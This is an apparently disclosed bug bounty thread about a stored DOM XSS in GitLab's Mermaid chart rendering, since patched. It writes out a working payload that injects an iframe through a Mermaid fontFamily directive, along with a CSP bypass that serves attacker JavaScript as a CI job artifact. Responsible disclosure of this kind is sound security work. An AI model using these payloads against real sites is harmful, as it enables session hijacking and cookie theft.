title: Stored DOM XSS via Mermaid chart

profile.name: GitLab
profile.about: A single application for the entire software development lifecycle.

activities.message:
Hi @taraszelyk,

Thank you for submitting this report! We will investigate the issue as soon as
possible, and should get back within a week.

Please do not submit your report or ask about its status through additional
channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team

Hey @taraszelyk,

Aren't you able to bypass the CSP? It's not a valid XSS otherwise but just an HTML injection and the severity may be downgraded.

Best regards,
@turtle_shell

So, I have found a way to bypass CSP. It's a bit harder since our payload is injected into <style> tag via innerHTML, but I will try to explain all steps needed to perform XSS attack.
First of all, we need to serve a JS code we want to execute somwehere on the gitlab.com Also, we need to have valid content-type(application/javascript) returned in the response. This can be achived by using CI/CD job artifacts. 

1. Create new project. 
2. Create a file `payload.js` with JS that will be executed in the victim's browser. For example:
```
alert(document.cookie)
```

3. Create .gitlab-ci.yml with such content:
```
js:
  script: "echo test"
  artifacts:
    paths:
    - payload.js
    expire_in: 4 week
```
This will trigger Gitlab CI and generate a job artfiact.

4. Wait a minute while Gitlab CI finished a job and navigate to "CI/CD" -> "Jobs" -> Latest Job -> Job artifacts
You will see a link to download `payload.js` job artifact. It should look like this: `https://gitlab.com/<user>/csp/-/jobs/<job_id>/artifacts/raw/payload.js`
Store it for later.

5. We are going to use the script from step 3 to bypass CSP since it is allowed to include scripts form gitlab.com.
To dynamically include a script we can use `<iframe>` with `srcdoc` attribute:
```
<iframe xmlns=\"http://www.w3.org/1999/xhtml\" srcdoc=\"<script src=https://gitlab.com/<user>/asdf/-/jobs/<job_id>/artifacts/raw/payload.js> </script>\">
```
However, since our payload is injected via innerHTML into `<style>` tag browser will not parse iframe and, therefore, will not include a script. But I have noticed that if we prepend `<iframe>` tag with `<title>` tag it will work again. I am not sure of the root cause of this behavior and will investigate it later, but it works here.

So our final payload which needs to be injected in any field that supports Markdown:
```
%%{init: { 'fontFamily': '<title><iframe xmlns=\"http://www.w3.org/1999/xhtml\" srcdoc=\"<script src=https://gitlab.com/bugbountyuser1/csp/-/jobs/1030502035/artifacts/raw/payload.js> </script>\">'} }%%
sequenceDiagram
Alice->>Bob: Hi Bob
Bob->>Alice: Hi Alice
```
[PoC](https://gitlab.com/bugbountyuser1/csp/-/issues/1)
{F1196286}

Hello @taraszelyk,

Thank you for submitting this report.

We have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/321931.  This issue will be made public 30 days following the release of a patch.

Given the severity of the report, we are paying an initial $500 on triage. Congratulations!

We will continue to update you via HackerOne as a patch is scheduled for release.

Best regards,
Dominic
GitLab Security Team

ETA for fix:

Hi @taraszelyk,

The issue you reported is currently scheduled to be fixed by 2021-05-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team

Hello @dcouture,
I can confirm that this issue was fixed by upgrading to Mermaid 8.9.2 which includes a patch for this vulnerability.  It is no longer reproducible on gitlab.com.

Hi @taraszelyk,

Thank you again for the report! Your finding has been patched in GitLab version 13.11.2. Congratulations!

As far as we're concerned this and #1106238 are duplicates since that one Mermaid upgrade solved both of them so we're not going to award beyond the initial $500 you already received.

Please let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.

We look forward to your next report!

Best regards,
Dominic
GitLab Security Team

Hello @dcouture,
Sorry, but I disagree with your decision that these two reports are duplicates. 
They are separate issues, though in one library. I've spent time to find both of them. And spent time to make them work in Gitlab environment. And yes, one "fix"(Mermaid upgrade) from your side was required to patch them. But it's only because I've disclosed two vulnerabilities at once to the maintainer of the library so he fixed them together. And even in the library, they were not patched by the same patch.

By your logic, I should have submitted one issue, wait till the patch, get bounty and then submit another to be sure that I will be rewarded for all work that was done. I don't want to do such things and I think that it's wrong, but I find it unfair to the researcher to say that they are duplicates and reward for only one issue. So, I believe, you should reconsider your decision.

Hello @taraszelyk,

I understand your point of view and completely understand that this was two different issues in mermaid, but we are not the mermaid project. With that said I'll bring your comment back to the team and we'll discuss about how to handle such issues.

Thank you for your patience, I'll give you an update when we take a decision.
Dominic
GitLab Security Team

Hello @taraszelyk,

I'm having trouble finding where the issues were fixed, I only see that one issue where the maintainer mentions both bugs. Do you happen to have a reference to the commits?

Thanks,
Dominic
GitLab Security Team
Sure, here is the issue https://github.com/mermaid-js/mermaid/issues/1940 and commit with fixes https://github.com/mermaid-js/mermaid/commit/0f31471b2ee3c7451485953d549fca7e2df1fb01

Hello @taraszelyk,

We are going to award this issue as well since as you mentioned it's a separate issue and we do not want to encourage hackers to hold on to vulnerabilities just to maximize payouts. Having both issues fixed in the same commit didn't make this easy, but we can see that the prototype pollution and the template issue have distinct root causes.

Best regards,
Dominic
GitLab Security Team
